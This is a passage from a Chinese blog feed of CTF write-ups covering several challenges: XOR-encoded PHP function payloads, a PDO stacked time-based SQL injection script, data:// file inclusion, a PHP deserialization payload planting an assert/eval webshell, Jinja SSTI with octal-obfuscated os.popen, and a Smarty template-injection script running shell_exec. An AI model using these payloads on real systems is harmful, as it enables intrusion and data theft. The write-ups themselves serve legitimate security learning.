    <content type="html"><![CDATA[<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或就是二进制对应位上运算：   </p><pre><code>1^1=0  1^0=10^0=0   </code></pre><p>%ff对应的是十进制的255，二进制就是<code>111111111</code>,所以它与其他异或后再与原来的异或就等于原来的<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png">       </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;phpinfo&#x27;</span>     <span class="hljs-comment">##要异或的</span>temp=[]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    temp.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i)),<span class="hljs-number">16</span>)^<span class="hljs-number">0xff</span>))<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:    print(j.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)print(<span class="hljs-string">&#x27;^&#x27;</span>+<span class="hljs-string">&#x27;%ff&#x27;</span>*<span class="hljs-built_in">len</span>(temp))</code></pre></code></pre><p><code>phpinfo</code>—-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>—-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(每一部分都要括起来)     </p><h2 id="有字符长度限制的话"><a href="#有字符长度限制的话" class="headerlink" title="有字符长度限制的话"></a>有字符长度限制的话</h2><p>比如:    </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="hljs-number">0x3</span>)) &gt; <span class="hljs-number">0xd</span> )    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;you are so close, omg&#x27;</span>);</code></pre></code></pre><p>这个是限定所用的字符种类小于或等于13       </p><p>看看有没有那个字符可以由其它的异或而来    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png">      </p><pre><code><pre><code class="hljs python">res=<span class="hljs-string">&#x27;\&#x27;().;_acdinprst&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res:        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> res:            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> res:                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ord</span>(j)^<span class="hljs-built_in">ord</span>(m)^<span class="hljs-built_in">ord</span>(n)==<span class="hljs-built_in">ord</span>(i)):                    <span class="hljs-keyword">if</span>(j==m <span class="hljs-keyword">or</span> j==n <span class="hljs-keyword">or</span> m==n):                        <span class="hljs-keyword">continue</span>                    <span class="hljs-keyword">else</span>:                        print(i+<span class="hljs-string">&#x27;==&#x27;</span>+j+<span class="hljs-string">&#x27;^&#x27;</span>+m+<span class="hljs-string">&#x27;^&#x27;</span>+n)</code></pre></code></pre><p>这里用三个来异或一个，两个的话太少，不行<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png">        </p><p>随便选三个   </p><pre><code>c==d^n^id==c^i^ni==c^n^dc^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre><p><code>print_r</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>—-&gt;加上两串<code>(%ff%ff%ff%ff%ff%ff%ff)</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>—–&gt;将对应位置上的字符修改，比如<code>i</code>在第三位，就把前三串的第三位改成<code>c n d</code>对应的<code>%9c %91 %9b</code>—-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p><p>scandir也换后     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png">   </p><p>原本十五个，加上<code>%ff</code>，十六个，减三，十三个</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;异或&quot;&gt;&lt;a href=&quot;#异或&quot; class=&quot;headerlink&quot; title=&quot;异或&quot;&gt;&lt;/a&gt;异或&lt;/h1&gt;&lt;p&gt;异或就是二进制对应位上运算：   &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1^1=0  
1^0=1
0^0=0   &lt;/code&gt;&lt;/pre&gt;
&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="or^or" scheme="http://lll-nnn.github.io/categories/CTF/or-or/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="knowledge" scheme="http://lll-nnn.github.io/tags/knowledge/"/>
    
    <category term="or^or" scheme="http://lll-nnn.github.io/tags/or-or/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lll-nnn.github.io/2021/07/11/BUU89/"/>
    <id>http://lll-nnn.github.io/2021/07/11/BUU89/</id>
    <published>2021-07-11T14:58:38.589Z</published>
    <updated>2021-07-14T01:07:07.341Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title:  [SWPU2019]Web4<br>date:  2021-07-11 22:58:38<br>tags:  [CTF,WP,sql]<br>categories:  [CTF,sql]<br>index_img:  /img/0016.png<br>banner_img:  /img/0015.jpg</p><hr><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>打开是一个登录框<br><img src="https://ftp.bmp.ovh/imgs/2021/07/29b0021639f71a2e.png">      </p><p>burp抓包加个<code>&#39;</code>发现报错<br><img src="https://ftp.bmp.ovh/imgs/2021/07/f58c9b6d66785aff.png">     </p><p>sql注入了，不过报错显示的是<code>fetch()</code>函数错误     </p><p><a href="https://xz.aliyun.com/t/3950"><code>PDO下的SQL注入</code></a><br>PDO—&gt;php数据对象       </p><p>PDO支持多语句执行，也就是堆叠注入      </p><p>PDO中的query()函数同数据库交互</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbms=<span class="hljs-string">&#x27;mysql&#x27;</span>;$host=<span class="hljs-string">&#x27;192.168.27.61&#x27;</span>;$dbName=<span class="hljs-string">&#x27;test&#x27;</span>;$user=<span class="hljs-string">&#x27;root&#x27;</span>;$pass=<span class="hljs-string">&#x27;root&#x27;</span>;$dsn=<span class="hljs-string">&quot;<span class="hljs-subst">$dbms</span>:host=<span class="hljs-subst">$host</span>;dbname=<span class="hljs-subst">$dbName</span>&quot;</span>;<span class="hljs-keyword">try</span> &#123;    $pdo = <span class="hljs-keyword">new</span> PDO($dsn, $user, $pass);&#125; <span class="hljs-keyword">catch</span> (PDOException $e) &#123;    <span class="hljs-keyword">echo</span> $e;&#125;$sql = <span class="hljs-string">&quot;select * from user where id=1;&quot;</span>;$sql .= <span class="hljs-string">&quot;create table test2 like user&quot;</span>;$stmt = $pdo-&gt;query($sql);<span class="hljs-keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;    var_dump($row);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;</code></pre></code></pre><p>prepare预处理      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/fb83bbb774d5c639.png">      </p><p>以此结合十六进制注入    </p><p>找了WP的脚本，但跑不出来-_-</p><pre><code><pre><code class="hljs python">    <span class="hljs-comment">#author: c1e4r</span>    <span class="hljs-keyword">import</span> requests    <span class="hljs-keyword">import</span> json    <span class="hljs-keyword">import</span> time    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>        <span class="hljs-comment">#题目地址</span>        url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span>        <span class="hljs-comment">#注入payload</span>        payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span>        flag = <span class="hljs-string">&#x27;&#x27;</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):            <span class="hljs-comment">#查询payload</span>            payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):                <span class="hljs-comment">#将构造好的payload进行16进制转码和json转码</span>                datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;                data = json.dumps(datas)                times = time.time()                res = requests.post(url = url, data = data)                <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:                    flag = flag + <span class="hljs-built_in">chr</span>(j)                    print(flag)                    <span class="hljs-keyword">break</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:        main()    ```  得到`glzjin_wants_a_girl_friend.<span class="hljs-built_in">zip</span>`源码     ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/b7c5c05c1929a09f.png)     `前端应用逻辑的基础在 controller 文件夹下面，而其他文件都是基于 basecontroller.php 所以我们打开 basecontroller.php 文件进行代码审计`          ```php    private $viewPath;        public function loadView($viewName =<span class="hljs-string">&#x27;&#x27;</span>, $viewData = [])        &#123;            $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;;            if(file_exists($this-&gt;viewPath))            &#123;                extract($viewData);                include $this-&gt;viewPath;            &#125;        &#125;</code></pre></code></pre><p><code>extract</code>可以进行变量覆盖     </p><p>找到<code>UserController.php</code>中调用了<code>loadView</code>且第二个参数可控      </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        $params = $_REQUEST;        $userModel = <span class="hljs-keyword">new</span> UserModel();        $listData = $userModel-&gt;getPageList($params);        <span class="hljs-keyword">$this</span>-&gt;loadView(<span class="hljs-string">&#x27;userList&#x27;</span>, $listData );    &#125;</code></pre></code></pre><p>在<code>userindex.php</code>中</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($img_file)) &#123;    $img_file = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;&#125;$img_dir = dirname(<span class="hljs-keyword">__FILE__</span>) . $img_file;$img_base64 = imgToBase64($img_dir);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . $img_base64 . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;</code></pre></code></pre><p>所以传入<code>img_file=/../flag.php</code>   </p><p>需要先进入<code>userIndex.php</code>，url中修改<code>r=UserIndex</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/f579ea716508e496.png">   </p><p>源码中图片base64解码得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;p&gt;title:  [SWPU2019]Web4&lt;br&gt;date:  2021-07-11 22:58:38&lt;br&gt;tags:  [CTF,WP,sql]&lt;br&gt;categories:  [CTF,sql]&lt;br&gt;index_img:  /img/0016.png&lt;b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CJBCTF</title>
    <link href="http://lll-nnn.github.io/2021/07/11/CJBCTF/"/>
    <id>http://lll-nnn.github.io/2021/07/11/CJBCTF/</id>
    <published>2021-07-11T02:38:49.000Z</published>
    <updated>2021-07-11T13:36:01.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul><li>文件包含</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-06-29 03:16:43</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-06-30 04:43:37</span><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><span class="hljs-comment"></span><span class="hljs-comment">*/</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    $ext = pathinfo($_GET[<span class="hljs-string">&#x27;file&#x27;</span>], PATHINFO_EXTENSION);    <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;        <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];    &#125;&#125;</code></pre></code></pre><p><code>pathinfo</code>要求传入的<code>file</code>后缀名为<code>php</code>，就会<code>include</code>      </p><p>看到include要想到伪协议了    </p><p>这里用<code>data://text/plain</code>     </p><p>payload:<code>?file=data://text/plain,&lt;?php var_dump(scandir(&#39;/&#39;));?&gt;.php</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/6a15b87627e024ff.png">    </p><p><code>?file=data://text/plain,&lt;?php echo file_get_contents(&#39;/secret&#39;);?&gt;.php</code><br>得到flag     </p><h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul><li>代码审计</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;var_dump&quot;</span>;    <span class="hljs-keyword">public</span> $msg=<span class="hljs-string">&quot;Happy to cjb&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;msg))&#123;            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&quot;var_dump&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;msg=<span class="hljs-string">&quot;You look dangerous!!!&quot;</span>;            $safe=<span class="hljs-string">&quot;I think waf is enough.&quot;</span>;        &#125;        call_user_func(<span class="hljs-keyword">$this</span>-&gt;name,<span class="hljs-keyword">$this</span>-&gt;msg);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        var_dump($safe);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;info&#x27;</span>]))&#123;    $info=$_POST[<span class="hljs-string">&#x27;info&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/s:4:&quot;name&quot;;s:\d:&quot;v\w*&quot;/&#x27;</span>,$info))&#123;        unserialize($info);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I just love v&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    $hacker=<span class="hljs-keyword">new</span> Hacker();    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></code></pre><ul><li><p>第一种思路：在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（类的属性个数要加1）<br>  <code>\([^()]*\([^()]*\)</code>这条正则过滤的时括号嵌套<code>(())</code>   </p><p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png">    </p><p>  <code>shell=echo file_get_contents(&#39;/you_never_know_my_name&#39;)</code>   </p></li></ul><ul><li><p>第二种思路：利用<code>$safe</code><br>  根目录payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;&quot;;&#125;</code><br>  <code>chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;</code>这样穿越目录tql   </p><p>  读flagpayload：<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;).file_get_contents(&#39;you_never_know_my_name&#39;)&quot;;&#125;</code>      </p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;warmup&quot;&gt;&lt;a href=&quot;#warmup&quot; class=&quot;headerlink&quot; title=&quot;warmup&quot;&gt;&lt;/a&gt;warmup&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;文件包含&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&lt;pre&gt;&lt;code class=&quot;hlj</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="CJBCTF" scheme="http://lll-nnn.github.io/tags/CJBCTF/"/>
    
  </entry>
  
  <entry>
    <title>Newctf</title>
    <link href="http://lll-nnn.github.io/2021/06/02/newctf/"/>
    <id>http://lll-nnn.github.io/2021/06/02/newctf/</id>
    <published>2021-06-02T14:48:05.000Z</published>
    <updated>2021-06-02T15:06:52.513Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2021-6-1萌新赛-easy-web"><a href="#2021-6-1萌新赛-easy-web" class="headerlink" title="2021.6.1萌新赛-easy_web"></a>2021.6.1萌新赛-easy_web</h2><p>hint:这个图片真好看呀，没啥隐藏的东西吧    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/a108d4199c1e415b.png">       </p><p>第一点：<code>md5($six_number) == &#39;e10adc3949ba59abbe56e057f20f883e&#39;</code><br>这一串是123456的MD5       </p><p>第二点：<code>===</code>可以数组绕过        </p><p>第三点：<code>$array[++$c]=1</code>数组索引溢出，<code>$c=9223372036854775806</code>      </p><p>payload:<code>webp=123456&amp;a[]=1&amp;b[]=2&amp;c=9223372036854775806</code>     </p><p>返回：   </p><pre><code>你觉得就这么简单吗？？？，可以告诉你密码哦！        password: xluoyyds123456@@@      </code></pre><p>然后是一个图片隐写，下载下来背景图片，后缀改为<code>.rar</code>       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/06/8c299e4b1ca8b594.png">         </p><p>输入密码得到flag    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2021-6-1萌新赛-easy-web&quot;&gt;&lt;a href=&quot;#2021-6-1萌新赛-easy-web&quot; class=&quot;headerlink&quot; title=&quot;2021.6.1萌新赛-easy_web&quot;&gt;&lt;/a&gt;2021.6.1萌新赛-easy_web&lt;/h2&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>NEEPUCTF</title>
    <link href="http://lll-nnn.github.io/2021/05/27/NEEPUCTF/"/>
    <id>http://lll-nnn.github.io/2021/05/27/NEEPUCTF/</id>
    <published>2021-05-27T14:04:57.000Z</published>
    <updated>2021-05-29T03:53:23.082Z</updated>
    
    <content type="html"><![CDATA[<h2 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h2><p>打开环境    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/b36aac21b99441e6.png"></p><p>就在这里，我居然没找到，太失败了   </p><h2 id="The-myth-of-Aladdin"><a href="#The-myth-of-Aladdin" class="headerlink" title="The_myth_of_Aladdin"></a>The_myth_of_Aladdin</h2><p>SSTI<br>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%print()%&#125;</code>替代<br><code>.</code>用<code>[]</code>替换<br>过滤了类名，八进制或者Unicode均可绕过     </p><p>payload：<code>&#123;%print(().__class__.__base__.__subclass__()[95].__init__.__globals__.__builtins__.__import__('os').popen('ls').read())%&#125;</code>   </p><p>转八进制     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$str=<span class="hljs-string">&#x27;read&#x27;</span>;$res=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($str);$i++)&#123;    $res.=<span class="hljs-string">&quot;\\&quot;</span>.decoct(ord($str[$i]));&#125;<span class="hljs-keyword">echo</span> $str.<span class="hljs-string">&quot;\n&quot;</span>;var_dump($res);</code></pre></code></pre><p>en-payload:<code>&#123;%print(()["\137\137\143\154\141\163\163\137\137"]["\137\137\142\141\163\145\137\137"]["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]()[95]["\137\137\151\156\151\164\137\137"]["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]["\137\137\151\155\160\157\162\164\137\137"]("o""s")["\160\157\160\145\156"]("ls")["\162\145\141\144"]())%&#125;</code>     </p><p>空格用<code>%09</code>代替     </p><p>最后读取flag过滤了<code>Neepu</code>，Unicode编码<br><code>cat /flag|base64</code>—&gt;<code>\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u007c\u0062\u0061\u0073\u0065\u0036\u0034</code>     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/36675dab86b84736.png">    </p><p>WP是使用截断的方法读取flag的<br><code>&quot;c&quot;&quot;ut%09-c%092-40%09/fl&quot;&quot;ag&quot;</code><br>cut<br> <code>-c</code>:仅显示行中指定范围的字符；     </p><h2 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h2><p>打开环境是个登录框，万能密码即可登录<code>adwa&#39;=&#39;0</code><br>进入后是个小游戏<br><img src="https://ftp.bmp.ovh/imgs/2021/05/00e8b9a1dd156058.png">     </p><p>验证码图片的名字就是验证码，可以写脚本跑    </p><p>猜对五次后会进行跳转<br><code>http://neepusec.club:18943/index.php?file=rander.php</code>       </p><p>可以用为协议读取下源码<br><code>?file=php://filter/read=convert.base64-encode/resource=rander.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// create object</span><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;num&#x27;</span>] &gt;= <span class="hljs-number">5</span>) &#123;    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;smarty/Smarty.class.php&#x27;</span>);    $smarty = <span class="hljs-keyword">new</span> Smarty;    $name = $_SESSION[<span class="hljs-string">&quot;username&quot;</span>];    $smarty-&gt;display(<span class="hljs-string">&#x27;string:恭喜 &#x27;</span>.$name.<span class="hljs-string">&#x27; 获得了胜利&#x27;</span>);&#125;</code></pre></code></pre><p><code>display</code>存在PHP模板注入     </p><p>名字改成模板注入语句即可<br>这里还有<code>disable_function</code>,可以用<code>shell_exec</code>    </p><p>WP的EXP：        </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">&quot;http://neepusec.club:18943&quot;</span>s = requests.Session()<span class="hljs-comment">#payload = &quot;&#123;&#123;shell_exec(\&quot;\ls\t/\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>payload = <span class="hljs-string">&quot;&#123;&#123;shell_exec(\&quot;cat\t/This_is_your_Flag\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span>login_data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload&#125;res0 = s.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data = login_data)res1 = s.get(url+<span class="hljs-string">&quot;/index.php&quot;</span>)reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res1.text)data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>):    res3 = s.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data)    reg = re.findall(<span class="hljs-string">&#x27;pic\/.*?\.jpg&#x27;</span>,res3.text)    data=&#123;<span class="hljs-string">&quot;authcode&quot;</span>:reg[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&quot;guess&quot;</span>:<span class="hljs-string">&quot;on&quot;</span>&#125;    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(res3.text)!=<span class="hljs-number">3287</span>):        print(i)        print(res3.text)        <span class="hljs-keyword">break</span></code></pre></code></pre><p>另一种方法<a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">（日志包含）</a>：<br>日志路径<code>file=/var/log/nginx/access.log</code><br><img src="https://ftp.bmp.ovh/imgs/2021/05/4ad56cf981691d27.png">       </p><p>写入一句话<br><img src="https://ftp.bmp.ovh/imgs/2021/05/81e22ec2143d5c2f.png"></p><p><a href="https://www.cnblogs.com/erR0Ratao/p/14806464.html">more</a>     </p><p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">日志包含</a>     </p><hr><p><a href="https://www.anquanke.com/post/id/242237#h3-2">最后两题</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;remote-table&quot;&gt;&lt;a href=&quot;#remote-table&quot; class=&quot;headerlink&quot; title=&quot;remote_table&quot;&gt;&lt;/a&gt;remote_table&lt;/h2&gt;&lt;p&gt;打开环境    &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>MTCTF CSICN</title>
    <link href="http://lll-nnn.github.io/2021/05/25/MTCISCN/"/>
    <id>http://lll-nnn.github.io/2021/05/25/MTCISCN/</id>
    <published>2021-05-25T06:48:38.000Z</published>
    <updated>2021-05-25T09:04:27.193Z</updated>
    
